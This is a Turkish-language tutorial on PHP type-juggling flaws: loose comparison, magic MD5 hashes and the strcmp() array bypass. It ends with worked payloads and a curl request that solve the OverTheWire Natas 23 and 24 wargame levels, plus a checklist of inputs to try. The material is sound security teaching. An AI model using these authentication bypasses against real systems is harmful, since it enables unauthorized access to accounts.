# 🌐 Web Güvenliği — PHP Type Juggling

> PHP bazen iki farklı türdeki değeri karşılaştırırken
> sana sürpriz yapacak sonuçlar üretir.

---

## 📋 İçindekiler

- [PHP Tip Sistemi](#php-tip-sistemi)
- [== vs === Farkı](#-vs--farkı)
- [Tehlikeli Karşılaştırmalar](#tehlikeli-karşılaştırmalar)
- [Magic Hash Zafiyeti](#magic-hash-zafiyeti)
- [strcmp() Bypass](#strcmp-bypass)
- [Natas'ta Kullanım](#natasta-kullanım)

---

## PHP Tip Sistemi

PHP **dinamik tipli** bir dildir — değişkenin tipini sen belirtmezsin, PHP otomatik belirler. Ve iki değeri karşılaştırırken gerekirse tipleri dönüştürür.

```php
$a = "42";      // string
$b = 42;        // integer
$c = 42.0;      // float
$d = true;      // boolean
$e = "42abc";   // string
```

---

## == vs === Farkı

### == (Loose Comparison — Gevşek Karşılaştırma)

Karşılaştırmadan önce değerleri **aynı tipe dönüştürür**, sonra karşılaştırır.

```php
0   == "a"      // true  ← "a" integer'a dönüşür → 0
0   == ""       // true  ← "" integer'a dönüşür → 0
0   == "0"      // true
1   == "1"      // true
1   == "1abc"   // true  ← "1abc" → 1
100 == "1e2"    // true  ← "1e2" scientific notation → 100
```

### === (Strict Comparison — Katı Karşılaştırma)

Hem **değeri** hem **tipini** karşılaştırır. Tip dönüşümü yapmaz.

```php
0   === "a"     // false ← farklı tip
0   === 0       // true
"1" === 1       // false ← farklı tip
"0" === false   // false ← farklı tip
```

### Karşılaştırma Tablosu (PHP 7)

```php
// == ile tehlikeli eşitlikler
"0"    == false   // true
"0"    == null    // false
""     == false   // true
""     == null    // true
null   == false   // true
"php"  == 0       // true  ← string sayıya dönüşür → 0
"1"    == true    // true
"0"    == false   // true
```

> ⚠️ **Not:** PHP 8'de `0 == "a"` artık `false` döner. PHP 7 ve öncesinde `true`'dur. Natas'ta PHP 7 davranışı geçerlidir.

---

## Tehlikeli Karşılaştırmalar

### 1. Integer ile String Karşılaştırması

```php
$input = $_GET['answer'];   // "0"

if($input == 0) {           // "0" == 0 → true!
    echo "Correct!";
}

// Ama beklenen: sadece 0 sayısı doğru
// Saldırgan "abc" gönderebilir: "abc" == 0 → true (PHP 7)
```

### 2. Boolean Karşılaştırması

```php
if($result == true) { ... }
// $result = "false" (string) → true! (boş olmayan string her zaman true)
// $result = "0" → false (tek istisnalardan biri)
```

### 3. NULL Karşılaştırması

```php
if($secret == NULL) {
    // Reddedilmeli
}
// Girdi: "0" → "0" == NULL → false ✓
// Girdi: "" → "" == NULL → true ← bypass!
// Girdi: [] → [] == NULL → true ← boş dizi de null'a eşit (o da bypass eder)
```

---

## Magic Hash Zafiyeti

PHP'de MD5 veya SHA1 hash'leri `==` ile karşılaştırılırken özel bir durum oluşur.

### 0e ile Başlayan Hash'ler

`0e...` formatındaki string'ler PHP tarafından **scientific notation** (bilimsel gösterim) olarak yorumlanır:

```
0e1234 = 0 × 10^1234 = 0
```

Yani iki farklı `0e...` hash'i `==` ile karşılaştırıldığında `0 == 0` olur:

```php
md5("240610708")  // "0e462097431906509019562988736854"
md5("QNKCDZO")    // "0e830400451993494058024219903391"

md5("240610708") == md5("QNKCDZO")   // true!
// Çünkü: "0e46..." == "0e83..." → 0 == 0 → true
```

### Bilinen Magic Hash Değerleri

| String | MD5 Hash |
|--------|----------|
| `240610708` | `0e462097431906509019562988736854` |
| `QNKCDZO` | `0e830400451993494058024219903391` |
| `aabg7XSs` | `0e087386482136013740957780965295` |
| `aabC9RqS` | `0e041022518165728065344349536299` |

```php
// Bypass:
$input = "240610708";
if(md5($input) == "0e462097431906509019562988736854") {
    // == ile karşılaştırılıyor → magic hash → bypass!
    echo "Correct!";
}
```

---

## strcmp() Bypass

`strcmp($a, $b)` fonksiyonu:
- `$a < $b` ise negatif döner
- `$a == $b` ise 0 döner
- `$a > $b` ise pozitif döner

Güvenlik kontrolü genellikle şöyle yapılır:

```php
if(strcmp($_POST['password'], $secret) == 0) {
    // şifre doğru
}
```

### Array ile Bypass

PHP'de `strcmp()` ile bir array karşılaştırılırsa `NULL` döner:

```php
strcmp([], "string")   // NULL
NULL == 0              // true!
```

```
POST: password[]=herhangi_bir_şey

strcmp(["herhangi"], $secret) → NULL
NULL == 0 → true → giriş başarılı!
```

---

## Natas'ta Kullanım

### Natas 23 — Strstr + Integer Karşılaştırması

**Kaynak kod:**

```php
<?php
if(array_key_exists("passwd", $_REQUEST)){
    if(strstr($_REQUEST["passwd"], "iloveyou")
       && ($_REQUEST["passwd"] > 10)){
        echo "The password for natas24 is: <censored>";
    } else {
        echo "Wrong!";
    }
}
?>
```

**Koşullar:**
1. `passwd` içinde `"iloveyou"` geçmeli
2. `passwd` sayısal olarak `10`'dan büyük olmalı

**Analiz:**

`$_REQUEST["passwd"] > 10` → PHP string'i integer'a dönüştürür:

```php
"11iloveyou" > 10   // "11iloveyou" → 11 → 11 > 10 → true!
```

String'in başındaki sayıya bakılır.

**Payload:**

```
passwd = 11iloveyou
```

```
strstr("11iloveyou", "iloveyou") → "iloveyou" → truthy ✓
"11iloveyou" > 10 → 11 > 10 → true ✓
```

---

### Natas 24 — strcmp Array Bypass

**Kaynak kod:**

```php
<?php
if(array_key_exists("passwd", $_REQUEST)){
    if(!strcmp($_REQUEST["passwd"], "<censored>")){
        echo "The password for natas25 is: <censored>";
    } else {
        echo "Wrong!";
    }
}
?>
```

`!strcmp(...)` → strcmp 0 döndürürse giriş başarılı.

**Payload:**

```
passwd[]=herhangi
```

URL'de: `?passwd[]=x` veya form'da `passwd[]` olarak gönder.

```php
strcmp(["x"], $secret)   // NULL
!NULL → !0 → true → giriş başarılı!
```

```bash
curl -u natas24:[şifre] \
     "http://natas24.natas.labs.overthewire.org/?passwd[]="
```

---

### PHP Type Juggling — Kontrol Listesi

```
Kaynak kodda ara:
  ☐ == operatörü (=== yerine)
  ☐ strcmp() ile == 0 karşılaştırması
  ☐ md5/sha1 hash'leri == ile karşılaştırma
  ☐ strstr/strpos ile birleşik koşullar

Dene:
  ☐ Integer ile string karışımı: "10abc", "0e123"
  ☐ Array parametresi: param[]=değer
  ☐ Magic hash değerleri (0e ile başlayanlar)
  ☐ Boş string: param=
  ☐ NULL: param değerini gönderme
```

---

## 🔗 Kaynaklar

- [PortSwigger — PHP Type Juggling](https://portswigger.net/web-security/logic-flaws)
- [PHP Type Comparison Tables](https://www.php.net/manual/en/types.comparisons.php)
- [Magic Hashes — whitehatsec](https://www.whitehatsec.com/blog/magic-hashes/)
- [OWASP — Type Juggling](https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf)

---

**Önceki konu:** [16_http_redirect_bypass.md](./16_http_redirect_bypass.md)
**Sonraki konu:** [18_php_object_injection.md](./18_php_object_injection.md)

*Bu rehber [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) reposunun bir parçasıdır.*
